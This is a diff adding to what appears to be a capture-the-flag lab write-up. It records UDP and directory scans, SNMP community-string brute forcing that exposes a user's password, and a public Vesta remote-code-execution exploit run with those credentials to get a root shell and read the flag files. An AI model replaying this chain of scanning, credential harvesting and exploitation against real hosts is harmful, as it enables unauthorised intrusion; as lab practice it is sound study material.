@@ -124,3 +124,132 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 48.47 seconds
 
 ```
+## UDP NMAP
+```bash
+nmap -sU 192.168.165.156
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-02 17:45 +0000
+Stats: 0:02:17 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
+UDP Scan Timing: About 14.76% done; ETC: 18:00 (0:13:11 remaining)
+Stats: 0:13:11 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
+UDP Scan Timing: About 79.67% done; ETC: 18:01 (0:03:22 remaining)
+Nmap scan report for 192.168.165.156
+Host is up (0.098s latency).
+Not shown: 998 closed udp ports (port-unreach)
+PORT    STATE SERVICE
+53/udp  open  domain
+161/udp open  snmp
+```
+## Gobuster
+
+```bash
+gobuster dir -u http://192.168.215.156:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40 -x php,txt,html
+
+===============================================================
+Gobuster v3.8.2
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.215.156:80
+[+] Method:                  GET
+[+] Threads:                 40
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8.2
+[+] Extensions:              php,txt,html
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+index.html           (Status: 200) [Size: 1055]
+webmail              (Status: 301) [Size: 239] [--> http://192.168.215.156/webmail/]
+robots.txt           (Status: 200) [Size: 65]
+phpmyadmin           (Status: 301) [Size: 242] [--> http://192.168.215.156/phpmyadmin/]
+```
+
+```bash
+gobuster dir -u http://192.168.215.156:8080/phpmyadmin -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40 -x php,txt,html
+===============================================================
+Gobuster v3.8.2
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.215.156:8080/phpmyadmin
+
+index.php            (Status: 200) [Size: 10639]
+templates            (Status: 301) [Size: 257] [--> http://192.168.215.156:8080/phpmyadmin/templates/]
+themes               (Status: 301) [Size: 254] [--> http://192.168.215.156:8080/phpmyadmin/themes/]
+themes.php           (Status: 200) [Size: 10640]
+doc                  (Status: 301) [Size: 251] [--> http://192.168.215.156:8080/phpmyadmin/doc/]
+license.php          (Status: 200) [Size: 10641]
+navigation.php       (Status: 200) [Size: 10644]
+js                   (Status: 301) [Size: 250] [--> http://192.168.215.156:8080/phpmyadmin/js/]
+logout.php           (Status: 200) [Size: 10640]
+libraries            (Status: 403) [Size: 1226]
+changelog.php        (Status: 200) [Size: 10643]
+url.php              (Status: 302) [Size: 0] [--> /phpmyadmin/]
+export.php           (Status: 200) [Size: 10640]
+setup                (Status: 401) [Size: 381]
+Progress: 8786 / 882236 (1.00%)[ERROR] error on word aup: timeout occurred during the request
+[ERROR] error on word biz.html: timeout occurred during the request
+[ERROR] error on word biz.txt: timeout occurred during the request
+[ERROR] error on word 249: timeout occurred during the request
+[ERROR] error on word 249.php: timeout occurred during the request
+[ERROR] error on word 249.html: timeout occurred during the request
+[ERROR] error on word ui: timeout occurred during the request
+[ERROR] error on word 249.txt: timeout occurred during the request
+[ERROR] error on word 406: timeout occurred during the request
+[ERROR] error on word ui.php: timeout occurred during the request
+[ERROR] error on word 406.php: timeout occurred during the request
+[ERROR] error on word 406.html: timeout occurred during the request
+[ERROR] error on word ui.html: timeout occurred during the request
+[ERROR] error on word ui.txt: timeout occurred during the request
+sql                  (Status: 301) [Size: 251] [--> http://192.168.215.156:8080/phpmyadmin/sql/]
+sql.php              (Status: 200) [Size: 10637]
+locale               (Status: 301) [Size: 254] [--> http://192.168.215.156:8080/phpmyadmin/locale/]
+import.php           (Status: 200) [Size: 10640]
+```
+
+## SNMP
+
+```bash
+# Enumerate Strings
+onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt 192.168.165.156
+
+# Identified string: Public
+
+# Enumerate users and passwords
+snmpwalk -v2c -c public 192.168.165.156 NET-SNMP-EXTEND-MIB::nsExtendObjects
+
+#Results:
+jack:3PUKsX98BMupBiCf
+```
+
+## Log into 
+https://192.168.165.156:8083
+```bash
+jack:3PUKsX98BMupBiCf
+
+## Vesta Exploit
+https://github.com/CSpanias/vesta-rce-exploit
+```bash
+
+#Download
+wget https://github.com/CSpanias/vesta-rce-exploit/archive/refs/heads/main.zip
+
+# Exploit
+python3 vesta-rce-exploit.py -h                                        
+
+#Results
+
+usage: vesta-rce-exploit.py [-h] target_host username password
+
+#Rerun
+python3 vesta-rce-exploit.py https://192.168.165.156:8083/ jack 3PUKsX98BMupBiCf 
+
+#Root Shell Established
+
+# Grab "Jack" Flag
+cat /home/jack/local.txt
+
+# Grab "root" Flag
+cat /root/proof.txt
+7bfb5273d8616e77032c83e62aad4cc3
+
